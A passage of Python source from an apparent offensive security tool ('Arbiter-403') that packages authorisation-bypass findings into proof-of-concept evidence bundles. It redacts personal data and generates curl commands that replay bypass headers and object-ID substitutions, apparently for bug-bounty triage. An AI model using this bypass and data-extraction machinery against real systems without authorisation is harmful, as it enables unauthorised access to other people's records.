    populated  = 0
    empty_null = 0
    placeholder_count = 0
    issues: list[str] = []

    for key, value in data.items():
        if value is None:
            empty_null += 1
            issues.append(f"{key}: null")
            continue

        str_val = str(value).strip()

        if str_val == "":
            empty_null += 1
            issues.append(f"{key}: empty string")
            continue

        if str_val.lower() in _PLACEHOLDER_VALUES:
            placeholder_count += 1  # type: ignore
            issues.append(f"{key}: placeholder ('{str_val}')")
            continue

        # Nested null / empty checks for dicts and lists.
        if isinstance(value, dict) and not value:
            empty_null += 1
            issues.append(f"{key}: empty object {{}}")
            continue

        if isinstance(value, list) and not value:
            empty_null += 1
            issues.append(f"{key}: empty array []")
            continue

        populated += 1  # type: ignore

    quality_pct = (
        (float(populated) / float(total) * 100.0) if total > 0 else 0.0  # type: ignore
    )

    return {
        "total_fields":  total,
        "populated":     populated,
        "empty_or_null": empty_null,
        "placeholder":   placeholder_count,
        "field_issues":  issues,
        "quality_pct":   quality_pct,
    }


# ═══════════════════════════════════════════════════════════════════════
#  PoC Evidence Formatter — triager-ready output
# ═══════════════════════════════════════════════════════════════════════

# Redaction patterns — applied to string values in extracted content.
_REDACT_PATTERNS: list[tuple[re.Pattern, str]] = [
    # Email addresses
    (re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z]{2,}'),
     '[REDACTED_EMAIL]'),
    # JWT tokens (three base64 segments separated by dots)
    (re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+'),
     '[REDACTED_JWT]'),
    # UUIDs
    (re.compile(r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-'
                r'[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'),
     '[REDACTED_UUID]'),
    # Long hex tokens / API keys (32+ hex chars)
    (re.compile(r'\b[0-9a-fA-F]{32,}\b'),
     '[REDACTED_TOKEN]'),
    # Phone numbers (various formats)
    (re.compile(r'\+?\d[\d\s\-()]{8,}\d'),
     '[REDACTED_PHONE]'),
    # Credit card patterns (4 groups of 4 digits)
    (re.compile(r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b'),
     '[REDACTED_CC]'),
    # SSN-like patterns
    (re.compile(r'\b\d{3}-\d{2}-\d{4}\b'),
     '[REDACTED_SSN]'),
]

# Keys whose values should always be fully redacted.
_SENSITIVE_KEY_PATTERNS = re.compile(
    r'(?i)(password|passwd|secret|token|api_key|apikey|'
    r'access_key|private|credential|ssn|credit_card|'
    r'card_number|cvv|pin|auth)',
)


def format_poc_evidence(endpoint_id: int) -> dict:
    """
    Package the first 3 successful extractions into a triager-ready
    **Smoking Gun** evidence bundle.

    For each extraction:

    1. **Redact** sensitive values (emails, JWTs, UUIDs, long tokens,
       phone numbers, credit cards, SSNs) in the JSON content.
    2. **Generate a curl command** pre-filled with the bypass headers
       so the triager can reproduce the finding instantly.
    3. Include the ``verification_hash`` so the evidence can be
       independently verified.

    The bundle is saved to ``poc_evidence_<endpoint_id>.json`` in the
    current working directory.

    Parameters
    ----------
    endpoint_id : int

    Returns
    -------
    dict
        ::

            {
                "endpoint_id":   int,
                "generated_at":  str,
                "evidence_file": str,
                "evidence_count": int,
                "evidence": [
                    {
                        "index":             int,
                        "object_id":         str,
                        "combo_key":         str,
                        "verification_hash": str,
                        "traversal_mechanic": str,
                        "redacted_content":  dict | list | str,
                        "curl_command":      str,
                    },
                    ...
                ],
            }
    """
    conn = get_connection()
    try:
        # Fetch up to 3 extractions (ordered by insertion).
        rows = conn.execute(
            """
            SELECT object_id, combo_key, content_json,
                   verification_hash, traversal_mechanic
              FROM extraction_results
             WHERE endpoint_id = ?
               AND content_json != '{}'
               AND length(content_json) > 50
             ORDER BY id ASC
             LIMIT 3
            """,
            (endpoint_id,),
        ).fetchall()

        # Endpoint URL and method for curl generation.
        ep = conn.execute(
            "SELECT url, method FROM endpoints WHERE id = ?",
            (endpoint_id,),
        ).fetchone()
    finally:
        conn.close()

    if not rows:
        logger.info(
            "[POC] endpoint %d: no successful extractions to format.",
            endpoint_id,
        )
        return {
            "endpoint_id":   endpoint_id,
            "generated_at":  _now_iso(),
            "evidence_file": "",
            "evidence_count": 0,
            "evidence":      [],
        }

    evidence_list: list[dict] = []

    for idx, row in enumerate(rows):
        obj_id    = row["object_id"]
        combo_key = row["combo_key"]
        raw_json  = row["content_json"]
        v_hash    = row["verification_hash"]
        mechanic  = row["traversal_mechanic"]

        # Parse and redact.
        try:
            content = json.loads(raw_json) if isinstance(raw_json, str) else raw_json
        except (json.JSONDecodeError, TypeError):
            content = raw_json

        redacted = _redact_value(content)

        # Build the curl command.
        curl_cmd = _build_curl_command(
            endpoint_id, obj_id, ep,
        )

        evidence_list.append({
            "index":              idx + 1,
            "object_id":          obj_id,
            "combo_key":          combo_key,
            "verification_hash":  v_hash,
            "traversal_mechanic": mechanic,
            "redacted_content":   redacted,
            "curl_command":       curl_cmd,
        })

    # Assemble the bundle.
    bundle = {
        "_meta": {
            "tool":        "Arbiter-403",
            "description": "Proof-of-Concept evidence for authorisation "
                           "bypass with data exfiltration.",
            "warning":     "Content has been redacted. Verification hashes "
                           "correspond to the ORIGINAL (unredacted) data.",
        },
        "endpoint_id":    endpoint_id,
        "endpoint_url":   ep["url"] if ep else "",
        "generated_at":   _now_iso(),
        "evidence_count": len(evidence_list),
        "evidence":       evidence_list,
    }

    # Write to disk.
    filename = f"poc_evidence_{endpoint_id}.json"
    filepath = Path.cwd() / filename

    with open(filepath, "w", encoding="utf-8") as fh:
        json.dump(bundle, fh, indent=2, ensure_ascii=False, default=str)

    logger.info(
        "[POC] endpoint %d: %d evidence item(s) saved to %s",
        endpoint_id, len(evidence_list), filepath,
    )

    return {
        "endpoint_id":    endpoint_id,
        "generated_at":   bundle["generated_at"],
        "evidence_file":  str(filepath),
        "evidence_count": len(evidence_list),
        "evidence":       evidence_list,
    }


def _redact_value(value):
    """
    Recursively redact sensitive data in *value*.

    - Dicts: redact keys matching ``_SENSITIVE_KEY_PATTERNS`` entirely;
      apply regex patterns to all other string values.
    - Lists: redact each element.
    - Strings: apply ``_REDACT_PATTERNS`` regex substitutions.
    """
    if isinstance(value, dict):
        redacted = {}
        for k, v in value.items():
            if _SENSITIVE_KEY_PATTERNS.search(k):
                redacted[k] = "[REDACTED]"
            else:
                redacted[k] = _redact_value(v)  # type: ignore
        return redacted

    if isinstance(value, list):
        if len(value) > 2:
            return [_redact_value(item) for item in value[:2]] + ["...[truncated]"]  # type: ignore
        return [_redact_value(item) for item in value]

    if isinstance(value, str):
        result = value
        for pattern, replacement in _REDACT_PATTERNS:
            result = pattern.sub(replacement, result)
        return result

    # int, float, bool, None — pass through.
    return value


def _build_curl_command(
    endpoint_id: int,
    object_id: str,
    ep_row,
) -> str:
    """
    Generate a curl command that reproduces the bypass for *object_id*.

    Uses ``generate_extraction_payload`` to get the exact URL, method,
    and headers.
    """
    try:
        payload = generate_extraction_payload(endpoint_id, object_id)
    except ValueError:
        return f"# Could not generate payload for object {object_id}"

    if not payload.get("ready"):
        return f"# Payload not ready for object {object_id}"

    parts = ["curl"]

    # Method
    method = payload["method"].upper()
    if method != "GET":
        parts.append(f"-X {method}")

    # Headers
    for hdr_name, hdr_val in payload["headers"].items():
        # Escape single quotes in values.
        safe_val = hdr_val.replace("'", "'\\''")
        parts.append(f"-H '{hdr_name}: {safe_val}'")

    # Verbose flag for triager visibility.
    parts.append("-v")

    # URL (quoted).
    parts.append(f"'{payload['url']}'")

    # Separator for multi-line curl output (backslash + newline + indent).
    sep = " \\\n  "

    # Primer note (if method sequence is involved).
    if payload.get("primer_methods"):
        primer_note = (
            "\n# NOTE: Send primer request(s) first with method(s): "
            + ", ".join(payload["primer_methods"])
        )
        return sep.join(parts) + primer_note

    return sep.join(parts)


# ═══════════════════════════════════════════════════════════════════════
#  Internal helpers
# ═══════════════════════════════════════════════════════════════════════

def _build_extraction_request(
    url: str,
    method: str,
    variables: list[dict],
    object_id: str,
) -> dict:
    """
    Apply all variable mutations from the bypass combo just like
    ``transitions._build_combo_request``, then substitute *object_id*
    into the resulting URL.

    Returns ``{url, method, headers, primer_methods}``.
    """
    from urllib.parse import urlparse

    combo_url    = url
    combo_method = method
    combo_headers: dict[str, str] = {"User-Agent": USER_AGENT}
    primer_methods: list[str] | None = None

    for var in variables:
        cat  = var["category"]
        name = var["name"]
        val  = var["test_value"]

        if cat in _HEADER_CATEGORIES:
            header_name = _resolve_header_name(name, cat)
            combo_headers[header_name] = val

        elif cat == "Protocol":
            combo_url = _apply_protocol(combo_url, val)

        elif cat == "User-Agent":
            combo_headers["User-Agent"] = val

        elif cat == "Referer":
            origin = (
                f"{urlparse(combo_url).scheme}://"
                f"{urlparse(combo_url).netloc}"
            )
            combo_headers["Referer"] = val.replace("{origin}", origin)

        elif cat == "Object ID":
            combo_url = _substitute_object_id(combo_url, val)

        elif cat == "Method Sequence":
            parts = [m.strip() for m in str(val).split(",")]
            primer_methods = parts[:-1]  # type: ignore
            combo_method = parts[-1]

    # Final step: substitute the target object_id into the URL.
    # Only for genuine IDs (not offset-based targets).
    if not object_id.startswith("offset:"):
        combo_url = _substitute_object_id(combo_url, object_id)

    return {
        "url":            combo_url,
        "method":         combo_method,
        "headers":        combo_headers,
        "primer_methods": primer_methods,
    }


def _empty_payload(
    endpoint_id: int, object_id: str, combo_key: str,
) -> dict:
    """Return a payload stub with ``ready=False``."""
    return {
        "endpoint_id":    endpoint_id,
        "object_id":      object_id,
        "combo_key":      combo_key,
        "url":            "",
        "method":         "",
        "headers":        {},
        "primer_methods": None,
        "ready":          False,
    }


def _ensure_extraction_table(conn) -> None:
    """Idempotent ``CREATE TABLE IF NOT EXISTS`` for extraction_results."""
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS extraction_results (
            id                    INTEGER PRIMARY KEY AUTOINCREMENT,
            endpoint_id           INTEGER NOT NULL,
            combo_key             TEXT    NOT NULL DEFAULT '',
            object_id             TEXT    NOT NULL,
            content_json          TEXT    NOT NULL DEFAULT '{}',
            extraction_timestamp  TEXT    NOT NULL DEFAULT (datetime('now')),
            verification_hash     TEXT    NOT NULL DEFAULT '',
            traversal_mechanic    TEXT    NOT NULL DEFAULT '',
            created_at            TEXT    DEFAULT (datetime('now')),
            UNIQUE(endpoint_id, combo_key, object_id)
        );
        """
    )
    conn.commit()


def _ensure_queue_table(conn) -> None:
    """Idempotent ``CREATE TABLE IF NOT EXISTS`` for extraction_queue."""
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS extraction_queue (
            id              INTEGER PRIMARY KEY AUTOINCREMENT,
            endpoint_id     INTEGER NOT NULL,
            combo_key       TEXT    NOT NULL DEFAULT '',
            object_id       TEXT    NOT NULL,
            position        INTEGER NOT NULL DEFAULT 0,
            status          TEXT    NOT NULL DEFAULT 'pending',
            created_at      TEXT    DEFAULT (datetime('now')),
            UNIQUE(endpoint_id, combo_key, object_id)
        );
        """
    )
    conn.commit()


def _now_iso() -> str:
    """Return the current UTC time in ISO-8601 format."""
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
